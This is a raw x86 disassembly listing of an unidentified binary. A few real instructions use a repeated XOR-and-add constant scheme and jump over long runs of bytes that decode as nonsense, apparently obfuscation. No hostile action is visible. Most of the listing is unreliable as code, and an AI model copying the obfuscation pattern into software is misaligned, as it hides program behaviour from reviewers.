  40c3c6:	add    BYTE PTR [edi+0xd],ah
  40c3c9:	cmp    eax,0x2b707a46
  40c3ce:	mov    es,WORD PTR [edi+0xfcc429e]
  40c3d4:	mov    ebx,0xf2df7660
  40c3d9:	push   ebx
  40c3da:	out    0xbd,al
  40c3dc:	and    ax,0x9f53
  40c3e0:	jne    0x40c412
  40c3e2:	repz out 0x54,al
  40c3e5:	test   BYTE PTR [esi-0x75],0x45
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shl    DWORD PTR [edi+eax*8-0x80],cl
  40c449:	mov    eax,ds:0x7e7e8214
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	xchg   ebx,eax
  40c453:	xor    ebx,DWORD PTR [edx+0x4b9e443f]
  40c459:	cwde   
  40c45a:	add    eax,0x6bae76f7
  40c45f:	gs int 0x6c
  40c462:	sub    al,BYTE PTR [ebx]
  40c464:	cmp    eax,0xdfb8ec4c
  40c469:	(bad)  
  40c46a:	loope  0x40c456
  40c46c:	xchg   ecx,eax
  40c46e:	cmp    edi,DWORD PTR [ebx-0x1d77d81f]
  40c474:	aad    0x67
  40c476:	jp     0x40c45a
  40c478:	outs   dx,BYTE PTR ds:[esi]
  40c479:	shl    eax,cl
  40c47b:	sbb    edi,DWORD PTR [esi+esi*8]
  40c47e:	imul   esp,DWORD PTR [ebx+0x55],0xffffffc3
  40c482:	jge    0x40c45c
  40c484:	mov    esi,0xd850a2fa
  40c489:	cmp    al,0x5e
  40c48b:	sbb    edi,edx
  40c48d:	mov    dh,0x64
  40c48f:	out    0x3d,eax
  40c491:	jp     0x40c497
  40c493:	nop
  40c494:	dec    eax
  40c495:	sbb    ch,BYTE PTR [edi]
  40c497:	lock sbb DWORD PTR [edi+0x2a],edi
  40c49b:	pop    ds
  40c49c:	xor    bh,al
  40c49e:	shr    DWORD PTR [esi+0x352617e6],0xf7
  40c4a5:	or     eax,0x3287803a
  40c4aa:	(bad)
  40c4af:	sub    DWORD PTR [ecx-0x33],0x17b7d17f
  40c4b6:	cs (bad) 
  40c4b8:	shl    ecx,1
  40c4ba:	jp     0x40c4b7
  40c4bc:	in     eax,dx
  40c4bd:	fwait
  40c4be:	popa   
  40c4bf:	inc    edx
  40c4c0:	test   eax,0x1fbfbcab
  40c4c5:	int3   
  40c4c6:	out    dx,al
  40c4c7:	jp     0x40c45c
  40c4c9:	repz sub BYTE PTR [esi+0x1231bc33],dl
  40c4d0:	mov    ds,eax
  40c4d2:	or     bl,dh
  40c4d4:	inc    edx
  40c4d5:	fld    QWORD PTR [ebx-0x5a]
  40c4d8:	clc    
  40c4d9:	jno    0x40c461
  40c4db:	mov    al,ds:0xb09e0ce3
  40c4e0:	mov    ebx,0x9c649fe3
  40c4e5:	pop    ds
  40c4e6:	enter  0x485d,0x19
  40c4ea:	add    eax,0xe2ec1fbe
  40c4ef:	dec    edi
  40c4f0:	mov    eax,ds:0x8696018b
  40c4f5:	jle    0x40c4a4
  40c4f7:	popa   
  40c4f8:	icebp  
  40c4f9:	cwde   
  40c4fa:	push   ds
  40c4fb:	cld    
  40c4fc:	repnz mov WORD PTR [edi-0x58],fs
  40c500:	ins    DWORD PTR es:[edi],dx
  40c501:	pop    ds
  40c502:	adc    DWORD PTR [ecx-0xf],ecx
  40c505:	xchg   ecx,eax
  40c506:	cld    
  40c507:	mov    WORD PTR [ebx+esi*4-0x1a],cs
  40c50b:	mov    ecx,0x50b7c216
  40c510:	daa    
  40c511:	jmp    0x40c546
  40c513:	mov    esp,0x236b1071
  40c518:	icebp  
  40c519:	stos   DWORD PTR es:[edi],eax
  40c51a:	push   eax
  40c51b:	add    al,0xff
  40c51d:	mov    edi,ds
  40c51f:	out    dx,al
  40c520:	outs   dx,BYTE PTR ds:[esi]
  40c521:	cmp    al,0xe2
  40c523:	push   ebx
  40c524:	fcmovbe st,st(5)
  40c526:	stos   DWORD PTR es:[edi],eax
  40c527:	mov    eax,ds:0xfdf6e6f9
  40c52c:	int3   
  40c52d:	aam    0x1d
  40c52f:	int3   
  40c530:	jp     0x40c51d
  40c532:	pop    esi
  40c533:	push   ds
  40c534:	(bad)  
  40c535:	mov    ebx,0x271e6119
  40c53a:	ret    
  40c53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c53c:	mov    fs,WORD PTR ds:0x90a90bac
  40c542:	cmp    ah,BYTE PTR [esi-0x49]
  40c545:	mov    dl,0x5e
  40c547:	pop    ecx
  40c548:	jno    0x40c52d
  40c54a:	cmp    bh,ch
  40c54c:	fisttp WORD PTR ds:0xae721300
  40c552:	mov    al,bl
  40c554:	(bad)  
  40c555:	mov    ?,WORD PTR [ebx]
  40c557:	mov    DWORD PTR [edi-0x77],eax
  40c55a:	mov    ds:0x3407952,eax
  40c55f:	nop
  40c560:	push   cs
  40c561:	das    
  40c562:	sbb    eax,0x6efb05e
  40c567:	in     al,dx
  40c568:	retf   
  40c569:	mov    edx,0xb9826648
  40c56e:	fmulp  st(5),st
  40c570:	stos   BYTE PTR es:[edi],al
  40c571:	les    ebp,FWORD PTR [edi-0x823070a]
  40c577:	sub    eax,DWORD PTR [edx+0x46f69ee]
  40c57d:	(bad)  [ecx]
  40c57f:	cmp    eax,DWORD PTR [ebp-0x67]
  40c582:	cmp    ebx,ecx
  40c584:	sahf   
  40c585:	call   0x5467:0x7a3561fc
  40c58c:	cmp    bl,al
  40c58e:	not    DWORD PTR [eax+0x1]
  40c591:	cmp    eax,0xa5fb766e
  40c596:	div    DWORD PTR [edx-0x54]
  40c599:	pop    ecx
  40c59a:	xor    eax,0xb2095ba2
  40c59f:	dec    ebp
  40c5a0:	ins    BYTE PTR es:[edi],dx
  40c5a1:	test   al,0x5c
  40c5a3:	mov    ebx,0xdbe2d74f
  40c5a8:	int    0xee
  40c5aa:	jle    0x40c55c
  40c5ac:	ret    0x2bac
  40c5af:	dec    esp
  40c5b0:	inc    BYTE PTR [esi-0x1]
  40c5b3:	and    ah,BYTE PTR [edi+0x5cbf1983]
  40c5b9:	and    DWORD PTR [ecx],0x90005b80
  40c5bf:	jb     0x40c60a
  40c5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5c2:	sahf   
  40c5c3:	data16 loopne 0x40c5f5
  40c5c6:	or     eax,0x35e4077b
  40c5cb:	cmp    al,0xcf
  40c5cd:	cwde   
  40c5ce:	retf   
  40c5cf:	push   ecx
  40c5d0:	or     eax,0x676a604b
  40c5d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d6:	jmp    FWORD PTR [eax+0x5a2f4002]
  40c5dc:	mov    edi,0x30d833da
  40c5e1:	push   esi
  40c5e2:	pop    es
  40c5e3:	fnstenv [edi-0x5b]
  40c5e6:	xchg   esi,eax
  40c5e7:	jmp    0x2700:0xb189d9ef
  40c5ee:	shr    ebx,cl
  40c5f0:	pop    esp
  40c5f1:	push   ebp
  40c5f2:	addr16 pop edi
  40c5f4:	nop
  40c5f5:	adc    eax,0x5aa7f8a2
  40c5fa:	push   esp
  40c5fb:	(bad)  
  40c5fc:	aas    
  40c5fd:	stc    
  40c5fe:	and    ch,BYTE PTR [esi+0x79]
  40c601:	xchg   ecx,eax
  40c602:	int3   
  40c603:	mov    ch,0xfd
  40c605:	test   BYTE PTR [ebx+0x179476c0],dh
  40c60b:	adc    bl,BYTE PTR [esi]
  40c60d:	rol    DWORD PTR ds:0x4b748b04,1
  40c613:	aas    
  40c614:	xor    BYTE PTR [ebp+ebp*4-0x4a],0xcd
  40c619:	or     al,0xb5
  40c61b:	ins    DWORD PTR es:[edi],dx
  40c61c:	into   
  40c61d:	nop    DWORD PTR [edi+ebx*1]
  40c621:	cmp    bl,BYTE PTR [ebx+0x287123da]
  40c627:	mov    bl,bl
  40c629:	mov    ds:0xa0ccab64,eax
  40c62e:	adc    ecx,0x2eccbb2c
  40c634:	cmp    DWORD PTR [eax],eax
  40c636:	push   ecx
  40c637:	cmp    BYTE PTR [edi+0x32],0x1f
  40c63b:	jns    0x40c5fa
  40c63d:	stos   DWORD PTR es:[edi],eax
  40c63e:	mov    bh,0xe4
  40c640:	mov    edx,0x692881b1
  40c645:	sbb    eax,0x155c0e84
  40c64a:	pusha  
  40c64b:	call   0xb5b4:0x1af268ee
  40c652:	and    DWORD PTR [ebp-0x7f],eax
  40c655:	test   eax,0x48bfd35
  40c65a:	lahf   
  40c65b:	aad    0x33
  40c65d:	(bad)  
  40c65e:	jno    0x40c66e
  40c660:	sub    al,0x35
  40c662:	jnp    0x40c646
  40c664:	mov    ch,0x19
  40c666:	xchg   edx,eax
  40c667:	pop    edi
  40c668:	push   ecx
  40c669:	or     BYTE PTR [ebx+0x3150aa57],bh
  40c66f:	mov    ds:0x44b580a4,al
  40c674:	xor    bl,BYTE PTR [ecx-0x2c579dee]
  40c67a:	out    dx,eax
  40c67b:	dec    esp
  40c67c:	je     0x40c676
  40c67e:	retf   0x3e02
  40c681:	pushf  
  40c682:	in     al,dx
  40c683:	push   cs
  40c684:	xor    al,0xe5
  40c686:	in     eax,0x28
  40c688:	cli    
  40c689:	jbe    0x40c6a3
  40c68b:	mov    ds,WORD PTR [edx-0xf2df56b]
  40c691:	out    0x71,eax
  40c693:	leave  
  40c694:	inc    esp
  40c695:	adc    al,BYTE PTR [ebx]
  40c697:	sub    BYTE PTR [esi+0x32729b],bh
  40c69d:	add    edi,esi
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp+0x71f39ac1],dl
  40c6de:	call   0x387e:0x7e80dea7
  40c6e5:	jl     0x40c765
  40c6e7:	jle    0x40c6ee
  40c6e9:	adc    esp,DWORD PTR [edi+0x6e851f95]
  40c6ef:	aad    0x4b
  40c6f1:	repnz cmp eax,0xae3696c4
  40c6f7:	retf   0xa4eb
  40c6fa:	sbb    cl,cl
  40c6fc:	xchg   esp,eax
  40c6fd:	outs   dx,BYTE PTR ds:[esi]
  40c6fe:	sub    ecx,DWORD PTR [ebp+0x13]
  40c701:	stos   DWORD PTR es:[edi],eax
  40c702:	aad    0x45
  40c704:	push   edx
  40c705:	test   eax,0xfb2e2f51
  40c70a:	pop    ecx
  40c70b:	xchg   ebp,eax
  40c70c:	out    dx,al
  40c70d:	xor    cl,BYTE PTR [eax+0x51ce75c6]
  40c713:	sub    ah,al
  40c715:	cmp    bl,BYTE PTR [ecx]
  40c717:	adc    ecx,esp
  40c719:	cld    
  40c71a:	(bad)  
  40c71b:	test   al,0xf
  40c71d:	fdivr  st,st(0)
  40c71f:	jge    0x40c718
  40c721:	sahf   
  40c722:	or     edx,DWORD PTR [ebx]
  40c724:	pop    ds
  40c725:	sahf   
  40c726:	adc    dl,BYTE PTR [edi+ebp*2]
  40c729:	ds enter 0xf5dd,0x1d
  40c72e:	mov    ebp,0xf7ff61ba
  40c733:	push   edi
  40c734:	rcr    dl,cl
  40c736:	(bad)
  40c739:	mov    edx,0xe1b2fa41
  40c73e:	cs sahf 
  40c740:	dec    ecx
  40c741:	mov    al,ds:0x310a54ec
  40c746:	mov    ah,BYTE PTR [eax+0x17cafe91]
  40c74c:	mov    ds:0x34216cbe,al
  40c751:	push   ebp
  40c752:	inc    edx
  40c753:	cld    
  40c754:	enter  0x919f,0xd1
  40c758:	idiv   BYTE PTR [eax+0x671d90c]
  40c75e:	jns    0x40c72f
  40c760:	xchg   BYTE PTR [esi+0x2c],dl
  40c763:	(bad)  
  40c765:	mov    ecx,DWORD PTR [esi-0x3e3d7578]
  40c76b:	lock xchg esp,eax
  40c76d:	or     DWORD PTR [edi+edx*8+0x3fe59ae5],eax
  40c774:	jge    0x40c754
  40c776:	sub    ebp,esi
  40c778:	adc    ebp,DWORD PTR [edx+esi*4]
  40c77b:	jl     0x40c786
  40c77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c77e:	cmp    bl,BYTE PTR [esi]
  40c780:	sete   BYTE PTR [edx-0x1cc3714c]
  40c787:	push   ds
  40c788:	popa   
  40c789:	inc    esi
  40c78a:	add    DWORD PTR [eax-0x25],0xacf0f506
  40c791:	mov    edx,0xcb9a3468
  40c796:	stos   BYTE PTR es:[edi],al
  40c797:	bound  edi,QWORD PTR [edx+0x0]
  40c79a:	sbb    esi,ecx
  40c79c:	loop   0x40c773
  40c79e:	or     bh,BYTE PTR [esi-0x7f7f967f]
  40c7a4:	subps  xmm6,XMMWORD PTR [edi+0x71]
  40c7a8:	sbb    al,0xd6
  40c7aa:	and    eax,0xc71f2cc2
  40c7af:	outs   dx,DWORD PTR ds:[esi]
  40c7b0:	and    dh,dh
  40c7b2:	retf   
  40c7b3:	fimul  WORD PTR [ecx-0x5d149c89]
  40c7b9:	sar    BYTE PTR [eax],1
  40c7bb:	jb     0x40c796
  40c7bd:	test   BYTE PTR [edx-0x7201f02a],0x5d
  40c7c4:	mov    bh,0x38
  40c7c6:	xlat   BYTE PTR ds:[ebx]
  40c7c7:	mov    bl,0x9f
  40c7c9:	test   bl,cl
  40c7cb:	nop
  40c7cc:	(bad)  [edi+0x78206b3a]
  40c7d2:	cdq    
  40c7d3:	xchg   edi,eax
  40c7d4:	pop    edi
  40c7d5:	mov    dh,0x89
  40c7d7:	scas   al,BYTE PTR es:[edi]
  40c7d8:	fidivr WORD PTR [ecx+0x5bc63b94]
  40c7de:	sbb    BYTE PTR [ebx-0x50],al
  40c7e1:	mov    bh,0xbf
  40c7e3:	pop    esi
  40c7e4:	mov    ch,0x8
  40c7e6:	aad    0xe1
  40c7e8:	out    0x92,al
  40c7ea:	or     DWORD PTR [esi-0x5c],ebx
  40c7ed:	ds call 0x370212b1
  40c7f3:	(bad)  
  40c7f4:	jo     0x40c834
  40c7f6:	pop    es
  40c7f7:	int    0xac
  40c7f9:	(bad)  
  40c7fa:	fidivr DWORD PTR [esi-0x4fe26329]
  40c800:	add    DWORD PTR [edi-0x4acb6dd7],ecx
  40c806:	and    al,0x83
  40c808:	sbb    BYTE PTR [edx],0x7
  40c80b:	rol    BYTE PTR [ecx+0x63],cl
  40c80e:	mov    cl,BYTE PTR [edi+0x6fdebcf]
  40c814:	arpl   WORD PTR [ecx],cx
  40c816:	add    DWORD PTR [edx+0x32],0x2e
  40c81a:	and    al,0xae
  40c81c:	repnz cmp edx,esp
  40c81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c820:	xchg   BYTE PTR [ecx-0x2b],cl
  40c823:	repz adc al,0x84
  40c826:	adc    DWORD PTR [edx+0x65],esp
  40c829:	or     dl,bh
  40c82b:	into   
  40c82c:	sub    ax,WORD PTR [eax+0x638c0be5]
  40c833:	sbb    ch,BYTE PTR [edi-0x6]
  40c836:	and    eax,0xecbf4d45
  40c83b:	loop   0x40c88d
  40c83d:	ins    DWORD PTR es:[edi],dx
  40c83e:	mov    ecx,0x4ef6af0
  40c843:	inc    ecx
  40c844:	nop
  40c845:	pop    edx
  40c846:	mov    al,0x5f
  40c848:	mov    esi,0xf1a92383
  40c84d:	mov    dl,0x9e
  40c84f:	xor    bl,BYTE PTR [esi+0x1d]
  40c852:	mov    ds:0x9fb7ac9b,eax
  40c857:	pop    ds
  40c858:	cld    
  40c859:	mov    eax,0x84272f83
  40c85e:	imul   esp,DWORD PTR [esi+0x4b],0xa965b61f
  40c865:	dec    esp
  40c866:	push   ebx
  40c867:	leave  
  40c868:	xchg   DWORD PTR [ebx],ecx
  40c86a:	popf   
  40c86b:	dec    edi
  40c86c:	sub    ah,bh
  40c86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c86f:	arpl   WORD PTR [esi+0x66594620],cx
  40c875:	add    dh,BYTE PTR ds:0xa458580d
  40c87b:	mov    DWORD PTR [ecx+edi*1+0xcd34d93],ebx
  40c882:	adc    BYTE PTR [ebx],bl
  40c884:	xchg   ebx,eax
  40c885:	js     0x40c85d
  40c887:	ret    0xe23f
  40c88a:	mov    ds:0x90fa8351,eax
  40c88f:	xor    DWORD PTR ds:0x6c727b32,edx
  40c895:	ins    BYTE PTR es:[edi],dx
  40c896:	imul   esi,DWORD PTR [esi+ecx*1+0x6cb87d88],0xa190fa8d
  40c8a1:	fstp   TBYTE PTR ds:0xff210b2c
  40c8a7:	(bad)  
  40c8a8:	jmp    0x40c8e0
  40c8aa:	arpl   WORD PTR [ebp+ebp*2-0x3d],bx
  40c8ae:	ins    DWORD PTR es:[edi],dx
  40c8af:	push   ebp
  40c8b0:	jp     0x40c837
  40c8b2:	cmp    bl,BYTE PTR [esi+ecx*2]
  40c8b5:	mov    eax,0x29cbd590
  40c8ba:	inc    ebp
  40c8bb:	ins    DWORD PTR es:[edi],dx
  40c8bc:	dec    edx
  40c8bd:	jbe    0x40c8a6
  40c8bf:	lds    ebp,FWORD PTR [eax-0x677805d3]
  40c8c5:	jne    0x40c8d0
  40c8c7:	mov    esp,0x9e59da05
  40c8cc:	hlt    
  40c8cd:	bound  edi,QWORD PTR [ecx+eiz*1-0x24]
  40c8d1:	ret    
  40c8d2:	aas    
  40c8d3:	sub    eax,DWORD PTR [edi]
  40c8d5:	clc    
  40c8d6:	sub    bl,BYTE PTR [edx]
  40c8d8:	push   esp
  40c8d9:	mov    fs,WORD PTR [esi-0x294021f6]
  40c8df:	int3   
  40c8e0:	mov    eax,ds:0xae6c0a0e
  40c8e5:	push   esi
  40c8e6:	shr    BYTE PTR ds:0x83c3fc13,0xc
  40c8ed:	and    BYTE PTR [edi+0x26],cl
  40c8f0:	or     al,ah
  40c8f2:	sahf   
  40c8f3:	xchg   esi,eax
  40c8f4:	mov    ebx,0x8990e6fd
  40c8f9:	jb     0x40c8b6
  40c8fb:	in     eax,0x1b
  40c8fd:	dec    ebp
  40c8fe:	fs jno 0x40c8c1
  40c901:	jg     0x40c8df
  40c903:	stos   DWORD PTR es:[edi],eax
  40c904:	inc    ebx
  40c905:	mov    ecx,0x4aa7269a
  40c90a:	jle    0x40c8aa
  40c90c:	scas   eax,DWORD PTR es:[edi]
  40c90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c90e:	stc    
  40c90f:	out    dx,eax
  40c910:	dec    ebp
  40c911:	mov    dl,0xc9
  40c913:	in     eax,0xbe
  40c915:	push   eax
  40c916:	(bad)  
  40c917:	push   esp
  40c918:	sbb    ebx,edx
  40c91a:	inc    edi
  40c91b:	cmc    
  40c91c:	mov    eax,ds:0x1120938c
  40c921:	test   eax,0x622e6b82
  40c926:	inc    esi
  40c927:	inc    esi
  40c928:	xor    BYTE PTR [ebp+0x46a5e6a8],al
  40c92e:	mov    edx,DWORD PTR [ebp+0x14]
  40c931:	xor    eax,ecx
  40c933:	jmp    0x40cb96
  40c938:	pop    es
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [ecx],ebx
  40c945:	test   al,0x64
  40c947:	add    DWORD PTR [eax+0x387e7e8e],ebx
  40c94d:	jl     0x40c9cd
  40c94f:	jle    0x40c971
  40c951:	jg     0x40c963
  40c953:	inc    ebx
  40c954:	sub    al,0xcd
  40c956:	pushf  
  40c957:	hlt    
  40c958:	push   edx
  40c959:	pop    ss
  40c95a:	clc    
  40c95b:	mov    ebx,0x3592062a
  40c960:	in     eax,0xd1
  40c962:	adc    ecx,DWORD PTR [ecx-0x23]
  40c965:	xchg   BYTE PTR [ebx-0x22],al
  40c968:	pop    esp
  40c969:	test   al,0xb9
  40c96b:	xor    bh,BYTE PTR [ebp+0x318a307d]
  40c971:	pop    ebp
  40c972:	jnp    0x5c1fec98
  40c978:	fwait
  40c979:	and    eax,0xb6b9f966
  40c97e:	xchg   ecx,eax
  40c97f:	mov    cl,0x83
  40c981:	test   DWORD PTR [ebp+0x7],ebx
  40c984:	cmc    
  40c985:	mov    eax,0xfbe755ee
  40c98a:	pop    esp
  40c98b:	fcom   DWORD PTR ds:0xa4358a8a
  40c991:	and    bh,BYTE PTR [eax]
  40c993:	dec    ebp
  40c994:	scas   al,BYTE PTR es:[edi]
  40c995:	(bad)
  40c999:	xchg   DWORD PTR [ecx-0x14539cd7],esp
  40c99f:	scas   eax,DWORD PTR es:[edi]
  40c9a0:	and    dl,BYTE PTR [ebx-0xfbc8631]
  40c9a6:	xchg   BYTE PTR [edx-0x46],ah
  40c9a9:	adc    edi,DWORD PTR [esp+esi*2]
  40c9ac:	icebp  
  40c9ad:	xor    ch,bh
  40c9af:	mov    DWORD PTR [ebp+edi*4+0x76bf8dd3],edx
  40c9b6:	sub    bl,BYTE PTR [edi]
  40c9b8:	sub    cl,BYTE PTR [esi+0x7ab08d3a]
  40c9be:	xchg   edx,eax
  40c9bf:	call   0xa885a835
  40c9c4:	add    BYTE PTR [edx],cl
  40c9c6:	jae    0x40c962
  40c9c8:	xor    al,0xe7
  40c9ca:	sub    al,0x52
  40c9cc:	lods   al,BYTE PTR ds:[esi]
  40c9cd:	inc    esp
  40c9ce:	jmp    0xfbe4abaa
  40c9d3:	mov    ebx,0x9e7dae55
  40c9d8:	add    esi,DWORD PTR [eax+0x2]
  40c9db:	cmc    
  40c9dc:	mov    ebp,0xc84d078f
  40c9e1:	les    eax,FWORD PTR [esi-0x3e5bf9a3]
  40c9e7:	pop    edi
  40c9e8:	dec    edi
  40c9e9:	mov    ebp,esp
  40c9eb:	mov    ?,WORD PTR [ecx-0x4aeb3194]
  40c9f1:	xchg   edi,eax
  40c9f2:	out    0x67,eax
  40c9f4:	or     esp,DWORD PTR [esi-0x73]
  40c9f7:	test   al,0xb4
  40c9f9:	push   ecx
  40c9fa:	or     al,0x3a
  40c9fc:	or     al,0x11
  40c9fe:	xchg   ebx,eax
  40c9ff:	sbb    dl,cl
  40ca01:	sar    BYTE PTR [esi+eax*8+0x4bbedbc0],1
  40ca08:	imul   edx,DWORD PTR [ecx],0x3b
  40ca0b:	jno    0x40c9a2
  40ca0d:	mov    ebp,0x985b7383
  40ca12:	(bad)  
  40ca13:	jo     0x40c99f
  40ca15:	int3   
  40ca16:	and    dh,ch
  40ca18:	lods   eax,DWORD PTR ds:[esi]
  40ca19:	jno    0x40ca6c
  40ca1b:	mov    ecx,0xfbfb2d8c
  40ca20:	and    bh,BYTE PTR [eax]
  40ca22:	xchg   ebp,eax
  40ca23:	fstp   QWORD PTR [eax-0x7eded54a]
  40ca29:	or     eax,0xa3b1abf0
  40ca2e:	pop    eax
  40ca2f:	or     BYTE PTR [ecx+ecx*4],al
  40ca32:	iret   
  40ca33:	les    ecx,FWORD PTR [edi-0x8ee2ff4]
  40ca39:	in     al,dx
  40ca3a:	jmp    0x7607:0xfc38bc75
  40ca41:	push   ebp
  40ca42:	loope  0x40caac
  40ca44:	xchg   edx,eax
  40ca45:	dec    edi
  40ca46:	inc    eax
  40ca47:	mov    eax,DWORD PTR [ecx-0x6adf68a9]
  40ca4d:	and    DWORD PTR [eax+0x25],edi
  40ca50:	or     al,0xc4
  40ca52:	arpl   WORD PTR [ebp+0x29],cx
  40ca55:	in     eax,0xfd
  40ca57:	lahf   
  40ca58:	leave  
  40ca59:	je     0x40c9f7
  40ca5b:	dec    esp
  40ca5c:	clc    
  40ca5d:	sbb    DWORD PTR [ebp-0x24],ebp
  40ca60:	stos   DWORD PTR es:[edi],eax
  40ca61:	aas    
  40ca62:	jmp    0x40cacb
  40ca64:	mov    eax,ds:0x21e20077
  40ca69:	push   ecx
  40ca6a:	adc    eax,0xe60ba438
  40ca6f:	xchg   esi,eax
  40ca70:	imul   edi,DWORD PTR [edi],0xffffffd5
  40ca73:	add    al,0xcc
  40ca75:	addr16 inc ecx
  40ca77:	pushf  
  40ca78:	aad    0xea
  40ca7a:	adc    dl,BYTE PTR fs:[ebx+0x7dda5101]
  40ca81:	cmp    BYTE PTR [ebp+0x48cb36bc],0x83
  40ca88:	pop    es
  40ca89:	dec    edx
  40ca8a:	mov    edx,0x14eb12a
  40ca8f:	je     0x40ca49
  40ca91:	test   BYTE PTR [ebp-0x3944b6bb],cl
  40ca97:	fisttp QWORD PTR [edi-0x6b]
  40ca9a:	xchg   edi,eax
  40ca9b:	clc    
  40ca9c:	jmp    0xb904f5f6
  40caa1:	push   eax
  40caa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caa3:	sbb    BYTE PTR [edx+0x40],0x9c
  40caa7:	fsubr  DWORD PTR [esi-0x11470034]
  40caad:	cwde   
  40caae:	xchg   BYTE PTR [edi+0x1c],bl
  40cab1:	ror    si,cl
  40cab4:	int    0x7b
  40cab6:	ds xchg esp,eax
  40cab8:	ins    WORD PTR es:[edi],dx
  40caba:	xchg   DWORD PTR [esi+0x50],edi
  40cabd:	mov    BYTE PTR [eax],bl
  40cabf:	jnp    0x40caaf
  40cac1:	adc    BYTE PTR [ebx],dl
  40cac3:	shr    BYTE PTR [esi-0x6c],cl
  40cac6:	push   ss
  40cac7:	iret   
  40cac8:	jecxz  0x40cb0f
  40caca:	xchg   esp,eax
  40cacb:	inc    edx
  40cacc:	adc    al,0x49
  40cace:	popf   
  40cacf:	cli    
  40cad0:	cs lock pop cx
  40cad4:	mov    bh,0x9e
  40cad6:	jmp    0xd39c:0x6724bdb0
  40cadd:	cdq    
  40cade:	jno    0x40cb49
  40cae0:	inc    edi
  40cae1:	adc    dh,BYTE PTR [ebx+0x15]
  40cae4:	test   DWORD PTR [edx-0x67],ebx
  40cae7:	call   0x40984b2f
  40caec:	ins    DWORD PTR es:[edi],dx
  40caed:	hlt    
  40caee:	fwait
  40caef:	test   BYTE PTR [ebp-0x5b],ah
  40caf2:	jecxz  0x40cb2f
  40caf4:	jno    0x40cb06
  40caf6:	mov    al,ds:0x62c3e19d
  40cafb:	bound  eax,QWORD PTR [ebp+0x63e89051]
  40cb01:	adc    DWORD PTR [ebp+eiz*8-0x54],edi
  40cb05:	inc    edx
  40cb06:	les    edx,FWORD PTR [esi+0x1eb6b531]
  40cb0c:	push   0xad11ca19
  40cb11:	pop    esp
  40cb12:	repnz cmp al,dl
  40cb15:	mov    ecx,0xe63ea62d
  40cb1a:	mov    ah,dl
  40cb1c:	lock adc BYTE PTR [ecx],cl
  40cb1f:	or     eax,0x2120c128
  40cb24:	jmp    0x37a4:0x8c86d001
  40cb2b:	push   ecx
  40cb2d:	inc    ebx
  40cb2e:	arpl   WORD PTR ss:[ecx+0x1c],si
  40cb32:	add    al,0x67
  40cb34:	shl    BYTE PTR [ecx],1
  40cb36:	pop    ds
  40cb37:	jle    0x40cb62
  40cb39:	jnp    0x40cb04
  40cb3b:	adc    bl,BYTE PTR [eax]
  40cb3d:	xor    BYTE PTR ds:0x1e240181,dl
  40cb43:	push   eax
  40cb44:	add    BYTE PTR [eax+0x429f3014],cl
  40cb4a:	mov    ebx,0x82dbf996
  40cb4f:	sbb    ebp,0x4bda3db7
  40cb55:	ins    BYTE PTR es:[edi],dx
  40cb56:	jle    0x40cbbd
  40cb58:	scas   al,BYTE PTR es:[edi]
  40cb59:	xchg   DWORD PTR [eax-0x1f],ecx
  40cb5c:	ficom  WORD PTR ds:0x10c3f
  40cb62:	dec    eax
  40cb63:	shl    BYTE PTR [eax+ebp*1],1
  40cb66:	add    al,0x2
  40cb68:	jns    0x40cb14
  40cb6a:	loopne 0x40cb5f
  40cb6c:	ins    DWORD PTR es:[edi],dx
  40cb6d:	dec    BYTE PTR [eax]
  40cb6f:	xor    eax,DWORD PTR [edx+0x4bd0995a]
  40cb75:	retf   
  40cb76:	sbb    al,0xca
  40cb78:	aad    0x39
  40cb7a:	addr16 and esi,esi
  40cb7d:	dec    ecx
